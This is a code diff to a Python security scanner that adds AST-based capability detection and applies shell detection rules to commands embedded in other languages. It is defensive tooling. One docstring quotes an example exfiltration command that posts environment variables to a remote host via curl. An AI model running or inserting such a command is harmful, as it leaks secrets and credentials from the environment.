@@ -40,6 +40,7 @@ from cordon_scanner.core.models import (
 )
 from cordon_scanner.core.redact import Redactor
 from cordon_scanner.core.scoring import RiskScorer, ScoringContext
+from cordon_scanner.detect import embedded
 from cordon_scanner.detect.base import (
     BaseDetector,
     DetectorRequirements,
@@ -53,6 +54,7 @@ if TYPE_CHECKING:
 
     from cordon_scanner.core.content import FileContent
     from cordon_scanner.detect.base import Unit
+    from cordon_scanner.detect.embedded import Command
     from cordon_scanner.rules.loader import CompiledRule
 
 
@@ -100,6 +102,11 @@ class CapabilityDetector(BaseDetector):
             return ()
 
         hits = self._match_capabilities(content, candidates)
+        resolved, commands = self._resolved_capabilities(unit, content)
+        if not commands and unit.language != "python":
+            commands = embedded.extract(content.text, unit.language)
+        hits.extend(resolved)
+        hits.extend(self._embedded_capabilities(ctx, content, commands))
         findings: list[Finding] = list(self._composite_findings(unit, ctx, hits, candidates))
 
         # A truncated file was only partly examined, so say so. Claiming a clean
@@ -162,6 +169,105 @@ class CapabilityDetector(BaseDetector):
                 # Reporting every occurrence would inflate the evidence without
                 # changing any conclusion.
                 break
+
+        return hits
+
+    def _resolved_capabilities(
+        self, unit: FileUnit, content: FileContent
+    ) -> tuple[list[CapabilityHit], list[Command]]:
+        """Capabilities the patterns cannot see, resolved from the parsed tree.
+
+        Added to the regex hits rather than replacing them. The patterns stay
+        the fast path and the answer for every language this cannot parse; this
+        catches what a byte pattern structurally cannot -- an aliased import, a
+        bound name, a spliced string -- because those are the same primitive
+        written so that no literal appears.
+
+        Returns the commands found at spawn sites alongside the capabilities,
+        since those are what the shell rules are then run against.
+
+        Python only. `ast` is in the standard library, so this costs nothing
+        against the zero-runtime-dependency constraint. JavaScript needs a
+        parser that is not, which is a decision about that constraint rather
+        than a line of code, and it is not taken here.
+        """
+        if unit.language != "python":
+            return [], []
+
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        resolved = PythonAnalyzer.analyse(content.text)
+        return (
+            [
+                CapabilityHit(
+                    capability=hit.capability,
+                    rule_id=f"AST.PY.{hit.capability.name}",
+                    byte_start=0,
+                    byte_end=0,
+                    line=hit.line,
+                )
+                for hit in resolved
+            ],
+            [embedded.Command(text=hit.command, line=hit.line) for hit in resolved if hit.command],
+        )
+
+    def _embedded_capabilities(
+        self, ctx: ScanContext, content: FileContent, commands: list[Command]
+    ) -> list[CapabilityHit]:
+        """Shell rules, applied to shell commands written inside other languages.
+
+        A command handed to a spawn primitive is shell, whatever the file
+        extension says. Without this it is examined by the rules for the host
+        language, which see a string literal, and never by the rules that know
+        what the string means -- so `os.system("curl -d $(env) https://...")`
+        reads as one unremarkable spawn rather than as exfiltration.
+
+        Only the command text is matched, never the surrounding file, so this
+        cannot pick up a URL from a comment or an example from a docstring. The
+        hit is attributed to the line the call is on, which is where a reader
+        needs to look.
+        """
+        if not commands:
+            return []
+
+        if content.path.endswith((".sh", ".bash", ".zsh", ".ps1")):
+            # Already matched directly; running them twice would double the
+            # evidence without adding anything to it.
+            return []
+
+        # Paired with their capability here so the match loop has nothing
+        # optional left to unwrap.
+        shell_rules = [
+            (compiled, compiled.rule.capability)
+            for compiled in ctx.rules.for_language("shell")
+            if compiled.rule.capability is not None and compiled.match.regex is not None
+        ]
+        if not shell_rules:
+            return []
+
+        hits: list[CapabilityHit] = []
+        seen: set[str] = set()
+
+        for command in commands:
+            payload = command.text.encode("utf-8", "surrogatepass")
+            for compiled, capability in shell_rules:
+                if compiled.id in seen or compiled.match.regex is None:
+                    continue
+                prefilter = compiled.match.prefilter
+                if prefilter and not any(literal in payload for literal in prefilter):
+                    continue
+                if compiled.match.regex.search(payload) is None:
+                    continue
+                seen.add(compiled.id)
+                hits.append(
+                    CapabilityHit(
+                        capability=capability,
+                        rule_id=compiled.id,
+                        byte_start=0,
+                        byte_end=0,
+                        line=command.line,
+                    )
+                )
 
         return hits
 
